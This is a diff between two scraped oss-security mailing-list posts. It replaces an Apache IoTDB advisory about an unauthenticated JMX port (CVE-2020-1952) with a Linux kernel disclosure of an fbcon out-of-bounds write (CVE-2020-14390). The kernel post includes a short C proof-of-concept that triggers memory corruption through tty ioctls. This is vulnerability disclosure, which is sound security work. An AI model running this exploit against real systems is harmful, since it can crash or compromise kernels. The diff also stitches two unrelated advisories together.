@@ -1,36 +1,51 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/04/27/1
-Message-ID: <495649d.8617.171b9681ae6.Coremail.liudw@apache.org>
-Date: Mon, 27 Apr 2020 10:12:19 +0800 (GMT+08:00)
-From: "Dawei Liu" <liudw@...che.org>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: [CVE-2020-1952] Apache IoTDB (incubating)   Remote Code execution vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/09/15/2
+Message-ID: <CAH5WSp7F86OfgeOLROT7bGwH1jkTivrHp6KOsEnsHDaEq166AQ@mail.gmail.com>
+Date: Tue, 15 Sep 2020 18:23:20 +0800
+From: Minh Yuan <yuanmingbuaa@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2020-14390: Linux kernel: slab-out-of-bounds in fbcon
 Content-Type: text/plain; charset=utf-8
 
-Severity: Important
+Hi,
+
+I found a out-of-bound write in fbcon_redraw_softback while the kernel
+version <= 5.9.rc5. The oldest affected kernel version is 2.2.3.
+The root cause of this vulnerability is that the value of vc->vc_origin is
+not updated in time while invoking vc_do_resize.
+
+This is my PoC (need the permission to open and write the tty, and need to
+have a fbcon driver):
+
+// author by ziiiro@thu
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
 
 
-Vendor: The Apache Software Foundation
+int main(int argc, char** argv)
+{
+        int fd = open("/dev/tty1", O_RDWR, 0);
+        unsigned short size1[3] = {3, 0x21, 0};
+        ioctl(fd, 0x5609, size1); // VT_RESIZE
+        for (int i = 0; i < 30; i++) {
+            write(fd, "\x0a", 1);
+        }
+
+        signed int args[3] = {13, -5, 0};
+        ioctl(fd, 0x541c, args); // TIOCLINUX
+        unsigned short size2[3] = {3, 0x39, 0};
+        ioctl(fd, 0x5609, size2); // VT_RESIZE
+}
 
 
-Versions Affected:
-IoTDB  0.9.0 to 0.9.1
-IoTDB 0.8.0 to 0.8.2
+This is the commit to patch the issue:
+https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=50145474f6ef4a9c19205b173da6264a644c7489
 
+Thanks,
+Yuan Ming, Tsinghua University
 
-Description:
-When starting IoTDB, the JMX port 31999 is exposed with no certification.
-Then, clients could execute code remotely. 
-
-
-Mitigation: 0.8.x, 0.9.0, and 0.9.1 users should upgrade to 0.9.2.
-
-
-Example: An Attacker can execute code remotely in the IoTDB server through JMX port.
-
-
-Credit:  This issue was discovered by Wu﻿Xiong of QI’ANXIN YunYing Lab.
-
-
-Regards,
-The Apache IoTDB team
